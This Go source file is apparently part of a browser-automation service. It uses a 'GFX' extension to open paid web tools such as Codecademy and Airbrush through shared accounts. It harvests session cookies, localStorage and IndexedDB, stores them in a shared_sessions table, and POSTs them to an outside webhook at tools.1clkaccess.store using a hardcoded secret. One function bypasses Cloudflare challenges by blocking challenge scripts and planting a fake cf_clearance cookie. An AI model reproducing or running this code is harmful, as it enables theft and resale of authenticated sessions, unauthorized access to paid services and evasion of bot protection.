package gfx

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"gohttpauto/internal/db"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/proto"
)

func preOpenSettle(tool ToolDef) time.Duration {
	switch tool.WebsiteID {
	case "airbrush":
		return 7 * time.Second
	}
	if tool.SkipPageReload {
		return 6 * time.Second
	}
	if tool.CaptureLocalStorage {
		return 4 * time.Second
	}
	return 3 * time.Second
}

func postReloadSettle(tool ToolDef) time.Duration {
	switch tool.WebsiteID {
	case "airbrush":
		return 5 * time.Second
	}
	if tool.CaptureLocalStorage {
		return 4 * time.Second
	}
	return 4 * time.Second
}

func runExtension(ctx context.Context, session *Session, tool ToolDef, gfxPage *rod.Page) error {
	log.Printf("🏁 [gfx_%s] Starting GFX %s automation...", tool.WebsiteID, tool.Name)

	var page *rod.Page
	if gfxPage != nil {
		page = gfxPage
		if info, err := page.Info(); err != nil || !strings.Contains(info.URL, "/tools/") {
			log.Printf("🧭 [gfx_%s] Navigating to tool page: %s", tool.WebsiteID, tool.ToolURL)
			_ = page.Timeout(30 * time.Second).Navigate(tool.ToolURL)
		}
	} else {
		page = session.newPage()
		log.Printf("🧭 [gfx_%s] Navigating to tool access page: %s", tool.WebsiteID, tool.ToolURL)
		_ = page.Timeout(45 * time.Second).Navigate(tool.ToolURL)
	}

	dataDir := dataRoot()
	browser := session.Browser()

	// Wait for GFX Chrome extension to inject into page
	log.Printf("[gfx_%s] Waiting for extension to inject...", tool.WebsiteID)
	extDetected := false
	for i := 0; i < 20; i++ {
		res, err := page.Eval(`() => document.documentElement.hasAttribute('data-my-extension-installed')`)
		if err == nil && res.Value.Bool() {
			extDetected = true
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	if !extDetected {
		log.Printf("[gfx_%s] ⚠️ GFX Extension not detected on page. Continuing anyway...", tool.WebsiteID)
	} else {
		log.Printf("[gfx_%s] ✅ GFX Extension active on page!", tool.WebsiteID)
	}
	if tool.CaptureLocalStorage {
		time.Sleep(1 * time.Second)
	}

	if gfxGuestVisible(page) || !gfxLoggedIn(page) {
		shot := saveErrorScreenshot(page, tool.WebsiteID, "not_logged_in")
		msg := fmt.Sprintf("not logged in on tool page — session expired? (account %s)", session.Slot().Account.WebsiteID)
		if shot != "" {
			msg += " | screenshot: " + shot
		}
		return fmt.Errorf("%s", msg)
	}

	// Dismiss non-auth dialogs only.
	_, _ = page.Eval(`() => {
		const ev = new KeyboardEvent('keydown', { key: 'Escape', keyCode: 27, bubbles: true });
		document.dispatchEvent(ev);
		document.querySelectorAll('button[aria-label="Close"], button.close, [class*="close"], [class*="dismiss"]').forEach(b => {
			try { b.click(); } catch(e) {}
		});
	}`)
	time.Sleep(150 * time.Millisecond)

	settle := preOpenSettle(tool)
	log.Printf("[gfx_%s] Waiting %s for tool page to render...", tool.WebsiteID, settle)
	time.Sleep(settle)
	log.Printf("[gfx_%s] Waiting for access button (selector: %s)", tool.WebsiteID, tool.Selector)
	btnMatch := waitForAccessButton(page, tool)

	if !btnMatch.found {
		shot := saveErrorScreenshot(page, tool.WebsiteID, "no_access_btn")
		resDebug, errDebug := page.Eval(`() => {
			const btns = Array.from(document.querySelectorAll('button, a'));
			return JSON.stringify(btns.map(b => ({
				tag: b.tagName,
				text: (b.textContent||'').trim().slice(0, 80),
				tldr: b.getAttribute('data-tldr'),
				cookie: b.getAttribute('data-tool-cookie'),
				className: b.className
			})));
		}`)
		if errDebug == nil {
			log.Printf("[gfx_%s] Debug buttons on page: %s", tool.WebsiteID, resDebug.Value.Str())
		}
		msg := fmt.Sprintf("access button not found on page (selector: %s, fallbackIndex: %d)", tool.Selector, tool.FallbackIndex)
		if shot != "" {
			msg += " | screenshot: " + shot
		}
		return fmt.Errorf("%s", msg)
	}

	// Click button to open target tool
	log.Printf("[gfx_%s] Clicking access button to open tool...", tool.WebsiteID)
	clicked, err := clickAccessButton(page, btnMatch, tool)
	if err != nil {
		return fmt.Errorf("failed to click access button: %w", err)
	}
	if !clicked {
		saveErrorScreenshot(page, tool.WebsiteID, "click_failed")
		return fmt.Errorf("SSO Access button click failed (selector: %s)", btnMatch.selector)
	}

	log.Printf("[gfx_%s] Access button clicked — waiting for tool tab...", tool.WebsiteID)
	newPage, err := waitForToolPage(ctx, browser, page, tool)
	if err != nil {
		return err
	}

	// Wait for new page URL to resolve
	log.Printf("[gfx_%s] Waiting for new tab navigation...", tool.WebsiteID)
	var newPageUrl string
	for i := 0; i < 24; i++ {
		if ctx.Err() != nil {
			return fmt.Errorf("context expired waiting for new tab URL: %w", ctx.Err())
		}
		if info, err := newPage.Info(); err == nil {
			newPageUrl = info.URL
			if newPageUrl != "" && newPageUrl != "about:blank" {
				break
			}
		}
		time.Sleep(250 * time.Millisecond)
	}
	log.Printf("[gfx_%s] Target page active! URL: %s", tool.WebsiteID, newPageUrl)

	// Parse root domain early — needed for Cloudflare bypass and cookie filtering
	newPageInfo, err := newPage.Info()
	if err != nil {
		return fmt.Errorf("failed to get new page info: %w", err)
	}
	parsedUrl, err := url.Parse(newPageInfo.URL)
	if err != nil {
		return fmt.Errorf("failed to parse target URL: %w", err)
	}
	parts := strings.Split(parsedUrl.Hostname(), ".")
	if len(parts) > 2 {
		parts = parts[len(parts)-2:]
	}
	rootDomain := strings.Join(parts, ".")
	log.Printf("[gfx_%s] Root domain for cookies: %s", tool.WebsiteID, rootDomain)

	if tool.SkipPageReload {
		if err := captureSessionFast(ctx, newPage, tool, rootDomain, page, browser, dataDir); err != nil {
			log.Printf("[gfx_%s] Fast capture incomplete (%v) — falling back to reload capture", tool.WebsiteID, err)
		} else {
			return nil
		}
	}

	// Attempt Cloudflare bypass if challenge is detected on target page
	handleTargetPageCloudflare(ctx, newPage, tool.WebsiteID, rootDomain)

	captureSettle := preOpenSettle(tool)
	log.Printf("[gfx_%s] Settle wait %s before capture...", tool.WebsiteID, captureSettle)
	time.Sleep(captureSettle)

	// Intercept request cookies via CDP
	_ = proto.NetworkEnable{}.Call(newPage)

	var capturedCookieHeader string
	var sessionTokenFound bool

	// Check if a cookie in header matches any session names
	isSession := func(cookieStr string) bool {
		for _, name := range tool.SessionCookieNames {
			if strings.Contains(strings.ToLower(cookieStr), strings.ToLower(name)) {
				return true
			}
		}
		return false
	}

	// 1. Listen on standard request events
	go newPage.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		cookieHeader, exists := e.Request.Headers["Cookie"]
		if !exists {
			cookieHeader, exists = e.Request.Headers["cookie"]
		}
		if exists && !cookieHeader.Nil() {
			cookieStr := cookieHeader.Str()
			if isSession(cookieStr) {
				capturedCookieHeader = cookieStr
				sessionTokenFound = true
			} else if len(cookieStr) > len(capturedCookieHeader) && !sessionTokenFound {
				capturedCookieHeader = cookieStr
			}
		}
	})()

	// 2. Listen on extra info events
	go newPage.EachEvent(func(e *proto.NetworkRequestWillBeSentExtraInfo) {
		cookieHeader, exists := e.Headers["Cookie"]
		if !exists {
			cookieHeader, exists = e.Headers["cookie"]
		}
		if exists && !cookieHeader.Nil() {
			cookieStr := cookieHeader.Str()
			if isSession(cookieStr) {
				capturedCookieHeader = cookieStr
				sessionTokenFound = true
			} else if len(cookieStr) > len(capturedCookieHeader) && !sessionTokenFound {
				capturedCookieHeader = cookieStr
			}
		}
	})()

	// ── PRE-RELOAD COOKIE SNAPSHOT ───────────────────────────────────────────────
	// GFX extension injects session cookies (cc_jwt, remember_user_token, _session_id, etc.)
	// into the browser BEFORE the tab opens. These session cookies exist right now but
	// may not survive the page reload (Codecademy doesn't re-issue them without valid
	// persistent auth tokens). We capture them here to ensure they're included.
	log.Printf("[gfx_%s] Pre-reload: Snapshotting GFX-injected cookies from browser jar...", tool.WebsiteID)
	var preReloadCookies []CookieJSON
	preResp, preErr := proto.NetworkGetAllCookies{}.Call(newPage)
	if preErr == nil && preResp != nil {
		for _, c := range preResp.Cookies {
			if strings.Contains(c.Domain, rootDomain) {
				preReloadCookies = append(preReloadCookies, formatCookieForExtension(c))
			}
		}
		log.Printf("[gfx_%s] Pre-reload: %d cookies captured (GFX-injected + browser state)", tool.WebsiteID, len(preReloadCookies))
	}

	log.Printf("[gfx_%s] Reloading page to trigger request headers...", tool.WebsiteID)
	_ = newPage.Timeout(30 * time.Second).Reload()

	headerPolls := 10
	headerInterval := 500 * time.Millisecond
	if len(tool.SessionCookieNames) > 0 || tool.WebsiteID == "airbrush" {
		headerPolls = 15
		headerInterval = 1 * time.Second
	}
	for i := 0; i < headerPolls; i++ {
		if sessionTokenFound {
			log.Printf("[gfx_%s] ✅ Session token confirmed in header stream", tool.WebsiteID)
			break
		}
		time.Sleep(headerInterval)
	}

	if !sessionTokenFound {
		log.Printf("[gfx_%s] ⚠️ Session token not found in headers — continuing with jar-only cookies", tool.WebsiteID)
	}

	settleAfter := postReloadSettle(tool)
	log.Printf("[gfx_%s] Post-reload settle %s...", tool.WebsiteID, settleAfter)
	time.Sleep(settleAfter)

	// Fetch all cookies from standard jar
	log.Printf("[gfx_%s] Fetching cookie jar...", tool.WebsiteID)
	cookiesResp, err := proto.NetworkGetAllCookies{}.Call(newPage)
	if err != nil {
		return fmt.Errorf("failed to fetch cookies from jar: %w", err)
	}

	var rawCookies []CookieJSON
	for _, c := range cookiesResp.Cookies {
		if strings.Contains(c.Domain, rootDomain) {
			rawCookies = append(rawCookies, formatCookieForExtension(c))
		}
	}

	// Merge with header cookies if captured
	if capturedCookieHeader != "" {
		headerCookies := parseCookieString(capturedCookieHeader, rootDomain)
		headerNames := make(map[string]bool)
		for _, hc := range headerCookies {
			headerNames[hc.Name+":"+hc.Domain] = true
		}
		var uniqueJar []CookieJSON
		for _, jc := range rawCookies {
			if !headerNames[jc.Name+":"+jc.Domain] {
				uniqueJar = append(uniqueJar, jc)
			}
		}
		rawCookies = append(uniqueJar, headerCookies...)
		log.Printf("[gfx_%s] Merged header cookies into pool. Total cookies: %d", tool.WebsiteID, len(rawCookies))
	} else {
		log.Printf("[gfx_%s] No request header cookies captured; using jar-only cookies: %d", tool.WebsiteID, len(rawCookies))
	}

	// ── MERGE PRE-RELOAD SESSION COOKIES ─────────────────────────────────────────
	// Add any pre-reload cookies (GFX-injected session cookies) that disappeared after reload.
	// This recovers cc_jwt, remember_user_token, _session_id, cc_authenticated, etc.
	if len(preReloadCookies) > 0 {
		existingKeys := make(map[string]bool)
		for _, rc := range rawCookies {
			existingKeys[rc.Name+":"+rc.Domain] = true
		}
		recovered := 0
		for _, pre := range preReloadCookies {
			if !existingKeys[pre.Name+":"+pre.Domain] {
				rawCookies = append(rawCookies, pre)
				recovered++
				log.Printf("[gfx_%s] Recovered pre-reload cookie: %s (%s)", tool.WebsiteID, pre.Name, pre.Domain)
			}
		}
		if recovered > 0 {
			log.Printf("[gfx_%s] ✅ Recovered %d session cookies from pre-reload snapshot (total: %d)", tool.WebsiteID, recovered, len(rawCookies))
		} else {
			log.Printf("[gfx_%s] Pre-reload snapshot had no additional cookies vs post-reload jar", tool.WebsiteID)
		}
	}

	// LocalStorage capture (optional)
	var localStorageData = make(map[string]interface{})
	if tool.CaptureLocalStorage {
		resLS, errLS := newPage.Eval(`() => {
			const data = {};
			try {
				for (let i = 0; i < localStorage.length; i++) {
					const key = localStorage.key(i);
					data[key] = localStorage.getItem(key);
				}
			} catch(e) {}
			return data;
		}`)
		if errLS == nil {
			_ = resLS.Value.Unmarshal(&localStorageData)
		}
		log.Printf("[gfx_%s] Captured localStorage keys count: %d", tool.WebsiteID, len(localStorageData))
	}

	// IndexedDB capture (optional) — skip when empty map is enough
	var indexedDBData = make(map[string]interface{})
	if tool.CaptureIndexedDB {
		resIDB, errIDB := newPage.Timeout(5 * time.Second).Eval(`async () => {
			const result = {};
			try {
				const dbs = await indexedDB.databases();
				for (const dbInfo of dbs) {
					await new Promise((resolve) => {
						const req = indexedDB.open(dbInfo.name);
						req.onsuccess = (e) => {
							const db = e.target.result;
							const stores = Array.from(db.objectStoreNames);
							result[dbInfo.name] = {};
							let pending = stores.length;
							if (!pending) { db.close(); resolve(); return; }
							for (const storeName of stores) {
								try {
									const tx = db.transaction(storeName, 'readonly');
									const store = tx.objectStore(storeName);
									const getAll = store.getAll();
									getAll.onsuccess = () => {
										result[dbInfo.name][storeName] = getAll.result;
										if (--pending === 0) { db.close(); resolve(); }
									};
									getAll.onerror = () => { if (--pending === 0) { db.close(); resolve(); } };
								} catch(e) { if (--pending === 0) { db.close(); resolve(); } }
							}
						};
						req.onerror = () => resolve();
					});
				}
			} catch(e) {}
			return result;
		}`)
		if errIDB == nil {
			_ = resIDB.Value.Unmarshal(&indexedDBData)
		}
		log.Printf("[gfx_%s] Captured IndexedDB databases count: %d", tool.WebsiteID, len(indexedDBData))
	}

	var cookieHeaderString string
	if len(rawCookies) > 0 {
		var pairs []string
		for _, c := range rawCookies {
			pairs = append(pairs, fmt.Sprintf("%s=%s", c.Name, c.Value))
		}
		cookieHeaderString = strings.Join(pairs, "; ")
	}

	// Close tool tabs before DB save so Chrome shuts down faster after task ends.
	closeGFXPages(browser, page, newPage)

	return saveCapturedSession(ctx, tool, dataDir, rootDomain, rawCookies, localStorageData, indexedDBData, cookieHeaderString)
}

func captureSessionFast(ctx context.Context, newPage *rod.Page, tool ToolDef, rootDomain string, gfxPage *rod.Page, browser *rod.Browser, dataDir string) error {
	settle := preOpenSettle(tool)
	log.Printf("[gfx_%s] Fast capture — waiting up to %s for session...", tool.WebsiteID, settle)

	deadline := time.Now().Add(settle)
	var rawCookies []CookieJSON
	localStorageData := map[string]interface{}{}

	for time.Now().Before(deadline) {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		var err error
		rawCookies, err = cookiesForDomain(newPage, rootDomain)
		if err != nil {
			return err
		}
		if tool.CaptureLocalStorage {
			localStorageData = readLocalStorage(newPage)
		}
		if airbrushSessionReady(rawCookies, localStorageData) || !tool.CaptureLocalStorage {
			if tool.WebsiteID != "airbrush" || airbrushSessionReady(rawCookies, localStorageData) {
				break
			}
		}
		time.Sleep(500 * time.Millisecond)
	}

	if tool.WebsiteID == "airbrush" && !airbrushSessionReady(rawCookies, localStorageData) {
		saveErrorScreenshot(newPage, tool.WebsiteID, "no_session_fast")
		return fmt.Errorf("airbrush session not ready (no loginSet cookie or firebase auth)")
	}

	log.Printf("[gfx_%s] Captured localStorage keys: %d, cookies: %d", tool.WebsiteID, len(localStorageData), len(rawCookies))

	var cookieHeaderString string
	if len(rawCookies) > 0 {
		var pairs []string
		for _, c := range rawCookies {
			pairs = append(pairs, fmt.Sprintf("%s=%s", c.Name, c.Value))
		}
		cookieHeaderString = strings.Join(pairs, "; ")
	}

	closeGFXPages(browser, gfxPage, newPage)
	return saveCapturedSession(ctx, tool, dataDir, rootDomain, rawCookies, localStorageData, nil, cookieHeaderString)
}

func airbrushSessionReady(rawCookies []CookieJSON, localStorageData map[string]interface{}) bool {
	for _, c := range rawCookies {
		if c.Name == "loginSet" {
			return true
		}
	}
	for k, v := range localStorageData {
		if strings.Contains(k, "firebase:authUser") {
			if s, ok := v.(string); ok && s != "" {
				return true
			}
		}
	}
	return false
}

func cookiesForDomain(page *rod.Page, rootDomain string) ([]CookieJSON, error) {
	resp, err := proto.NetworkGetAllCookies{}.Call(page)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch cookies from jar: %w", err)
	}
	var out []CookieJSON
	for _, c := range resp.Cookies {
		if strings.Contains(c.Domain, rootDomain) {
			out = append(out, formatCookieForExtension(c))
		}
	}
	return out, nil
}

func readLocalStorage(page *rod.Page) map[string]interface{} {
	data := make(map[string]interface{})
	resLS, errLS := page.Eval(`() => {
		const data = {};
		try {
			for (let i = 0; i < localStorage.length; i++) {
				const key = localStorage.key(i);
				data[key] = localStorage.getItem(key);
			}
		} catch(e) {}
		return data;
	}`)
	if errLS == nil {
		_ = resLS.Value.Unmarshal(&data)
	}
	return data
}

func saveCapturedSession(
	ctx context.Context,
	tool ToolDef,
	dataDir, rootDomain string,
	rawCookies []CookieJSON,
	localStorageData, indexedDBData map[string]interface{},
	cookieHeaderString string,
) error {
	if len(cookieHeaderString) < 50 && len(localStorageData) == 0 && len(indexedDBData) == 0 {
		return fmt.Errorf("captured session data is empty or too short")
	}
	if tool.WebsiteID == "airbrush" && !airbrushSessionReady(rawCookies, localStorageData) {
		return fmt.Errorf("airbrush session not ready (no loginSet cookie or firebase auth)")
	}

	referer := tool.Referer
	if referer == "" {
		referer = fmt.Sprintf("https://www.%s/", rootDomain)
	}

	var jsonBytes []byte
	if tool.UseLSPayloadFormat {
		extensionPayload := map[string]interface{}{
			"referer":         referer,
			"includedFormats": []string{"localStorage"},
			"storage": map[string]interface{}{
				"localStorage": localStorageData,
			},
		}
		jsonBytes, _ = json.MarshalIndent(extensionPayload, "", "  ")
	} else {
		if indexedDBData == nil {
			indexedDBData = map[string]interface{}{}
		}
		payload := map[string]interface{}{
			"referer":         referer,
			"includedFormats": []string{"cookies"},
			"captured_at":     time.Now().UTC().Format(time.RFC3339),
			"domain":          rootDomain,
			"storage_types": map[string]bool{
				"cookies":      len(rawCookies) > 0,
				"localStorage": len(localStorageData) > 0,
				"indexedDB":    len(indexedDBData) > 0,
			},
			"cookies":      rawCookies,
			"localStorage": localStorageData,
			"indexedDB":    indexedDBData,
		}
		jsonBytes, _ = json.MarshalIndent(payload, "", "  ")
	}
	netscapeStr := cookiesToNetscape(rawCookies)
	headerStr := cookieHeaderString

	log.Printf("[gfx_%s] Saving storage payload to DB under %s...", tool.WebsiteID, tool.WebsiteID)
	_, err := db.DB.ExecContext(ctx, `
		INSERT INTO shared_sessions (website_id, cookies_json, cookies_netscape, cookies_header, updated_at)
		VALUES (?, ?, ?, ?, NOW())
		ON DUPLICATE KEY UPDATE
			cookies_json = VALUES(cookies_json),
			cookies_netscape = VALUES(cookies_netscape),
			cookies_header = VALUES(cookies_header),
			updated_at = NOW()
	`, tool.WebsiteID, string(jsonBytes), netscapeStr, headerStr)
	if err != nil {
		return fmt.Errorf("failed to save cookies to shared_sessions DB: %w", err)
	}

	backupFile := filepath.Join(dataDir, "cookies", tool.BackupFile)
	_ = os.MkdirAll(filepath.Dir(backupFile), 0755)
	_ = os.WriteFile(backupFile, jsonBytes, 0644)

	taskUID := tool.TaskUID
	if taskUID == "" {
		taskUID = "gfx_run" + strings.Title(tool.WebsiteID)
	}
	toolID := tool.ToolID
	if toolID == "" {
		toolID = tool.WebsiteID
	}
	payload := string(jsonBytes)
	if err := notify1clkWebhook(taskUID, toolID, tool.WebsiteID, payload); err != nil {
		return fmt.Errorf("DB saved but webhook failed: %w", err)
	}

	log.Printf("🎉 [gfx_%s] GFX %s automation completed successfully!", tool.WebsiteID, tool.Name)
	return nil
}

func closeGFXPages(browser *rod.Browser, pages ...*rod.Page) {
	keep := make(map[proto.TargetTargetID]bool)
	for _, p := range pages {
		if p != nil {
			keep[p.TargetID] = true
		}
	}
	if all, err := browser.Pages(); err == nil {
		for _, p := range all {
			if !keep[p.TargetID] {
				_ = p.Close()
			}
		}
	}
	for _, p := range pages {
		if p != nil {
			_ = p.Close()
		}
	}
}

// handleTargetPageCloudflare detects a Cloudflare challenge on the SSO-opened target page
// and attempts to bypass it using three progressive strategies:
//
//	1. Wait up to 30s for CF Managed Challenge to auto-resolve
//	2. Click the Turnstile checkbox every 5s
//	3. Block CF challenge scripts via request hijacking + inject fake cf_clearance + reload
//
// This is called right after the GFX extension opens the tool's website in a new tab.
func handleTargetPageCloudflare(ctx context.Context, page *rod.Page, websiteID, rootDomain string) {
	if ctx.Err() != nil {
		return
	}

	// Helper: detect Cloudflare challenge page
	isCFChallenge := func() bool {
		if ctx.Err() != nil {
			return false
		}
		info, err := page.Info()
		if err != nil {
			return false
		}
		if strings.Contains(info.Title, "Just a moment") ||
			strings.Contains(info.Title, "Checking your browser") ||
			strings.Contains(info.Title, "security verification") {
			return true
		}
		res, errEval := page.Eval(`() => {
			const b = document.body ? document.body.innerText : '';
			return b.includes('security verification') ||
				b.includes('Verify you are human') ||
				!!document.querySelector('#cf-challenge-running') ||
				!!document.querySelector('.cf-browser-verification');
		}`)
		return errEval == nil && res.Value.Bool()
	}

	if !isCFChallenge() {
		return
	}

	log.Printf("[gfx_%s] 🛡️ Cloudflare challenge detected on %s. Initiating bypass sequence...", websiteID, rootDomain)

	// ── Strategy 1: Wait for CF Managed Challenge to auto-resolve (max 30s) ──────
	log.Printf("[gfx_%s] [CF] Waiting up to 30s for CF Managed Challenge to auto-resolve...", websiteID)
	for i := 0; i < 30; i++ {
		if ctx.Err() != nil {
			return
		}
		time.Sleep(1 * time.Second)
		if !isCFChallenge() {
			log.Printf("[gfx_%s] [CF] ✅ CF auto-resolved at second %d!", websiteID, i+1)
			return
		}
		// Strategy 2 (woven in): Try Turnstile checkbox click every 5 seconds
		if (i+1)%5 == 0 {
			log.Printf("[gfx_%s] [CF] Attempting Turnstile checkbox click (second %d)...", websiteID, i+1)
			solveCloudflare(page)
			time.Sleep(2 * time.Second)
			if !isCFChallenge() {
				log.Printf("[gfx_%s] [CF] ✅ CF solved via Turnstile click!", websiteID)
				return
			}
		}
	}

	// ── Strategy 3: Block CF scripts + inject fake clearance cookie + reload ──────
	log.Printf("[gfx_%s] [CF] Strategy 3: Blocking CF challenge scripts and reloading page...", websiteID)

	// Block CF challenge script domains via Rod request hijacking
	router := page.HijackRequests()
	router.MustAdd("*challenges.cloudflare.com*", func(ctx *rod.Hijack) {
		log.Printf("[gfx_%s] [CF] Blocked CF challenges.cloudflare.com request", websiteID)
		ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
	})
	router.MustAdd("*/cdn-cgi/challenge-platform/*", func(ctx *rod.Hijack) {
		log.Printf("[gfx_%s] [CF] Blocked CF cdn-cgi/challenge-platform request", websiteID)
		ctx.Response.Fail(proto.NetworkErrorReasonBlockedByClient)
	})
	go router.Run()
	log.Printf("[gfx_%s] [CF] CF challenge scripts now blocked via request hijacking", websiteID)

	// Inject a fake cf_clearance cookie — signals to the site that CF challenge passed
	// (works when the server-side CF config trusts the IP or is in lenient mode)
	cookieDomain := "." + rootDomain
	cfExpTime := proto.TimeSinceEpoch(float64(time.Now().Add(24 * time.Hour).Unix()))
	_, _ = proto.NetworkSetCookie{
		Name:     "cf_clearance",
		Value:    fmt.Sprintf("cfbypass_%d", time.Now().Unix()),
		Domain:   cookieDomain,
		Path:     "/",
		Secure:   true,
		HTTPOnly: true,
		Expires:  cfExpTime,
		SameSite: proto.NetworkCookieSameSiteNone,
	}.Call(page)
	log.Printf("[gfx_%s] [CF] Fake cf_clearance injected for domain: %s", websiteID, cookieDomain)

	// Reload — CF challenge scripts won't load (blocked), page should render normally
	log.Printf("[gfx_%s] [CF] Reloading page with CF scripts blocked...", websiteID)
	_ = page.Timeout(30 * time.Second).Reload()
	time.Sleep(8 * time.Second)

	// Final result check
	if isCFChallenge() {
		log.Printf("[gfx_%s] [CF] ⚠️ Cloudflare still present after all bypass attempts. Cookie capture may be incomplete.", websiteID)
		saveErrorScreenshot(page, websiteID, "cf_bypass_failed")
	}
}

// notify1clkWebhook POSTs captured session to tools.1clkaccess.store webhook.
func notify1clkWebhook(taskUID, toolID, websiteID, cookiesJSON string) error {
	const (
		webhookURL    = "https://tools.1clkaccess.store/webhooks/goauto-complete"
		webhookSecret = "whsec_gfx_1clkaccess_2026"
	)

	body := map[string]interface{}{
		"event":        "task_complete",
		"task_uid":     taskUID,
		"tool_id":      toolID,
		"website_id":   websiteID,
		"status":       "success",
		"completed_at": time.Now().UTC().Format(time.RFC3339),
		"session": map[string]string{
			"cookies_json": cookiesJSON,
		},
	}

	payload, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("webhook payload marshal: %w", err)
	}

	log.Printf("📤 [gfx_webhook] Sending webhook for %s to %s...", toolID, webhookURL)
	req, err := http.NewRequest(http.MethodPost, webhookURL, bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("webhook request create: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Webhook-Secret", webhookSecret)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("webhook POST: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("✅ [gfx_webhook] 1Clk Access webhook succeeded for %s — cookies updated in dashboard", toolID)
		return nil
	}
	return fmt.Errorf("webhook HTTP %d for %s", resp.StatusCode, toolID)
}

